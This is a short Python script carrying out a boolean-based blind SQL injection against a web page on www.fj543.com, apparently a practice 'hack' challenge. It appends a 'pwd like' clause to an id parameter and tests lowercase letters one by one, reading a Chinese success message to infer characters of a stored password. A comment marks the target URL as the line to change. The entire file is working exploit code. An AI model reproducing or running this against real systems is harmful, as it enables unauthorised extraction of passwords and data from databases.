import requests

def login(_id):
    #需要改动处
    url = "http://www.fj543.com/hack/13sql.asp"
    data = {
        "id" : _id
    }
    res = requests.post(url,data=data).text

    if "数据库中有这条信息,但我不能直接告诉你密码。" in res:
        return True
    else:
        return False

def main():
    find_name = ""
    for i in range(97, 123):
        _id = "300 and pwd like '%"+str(chr(i))+"%'"

        print(_id)
        if login(_id):
            find_name += chr(i)
            print(find_name)
            break
main()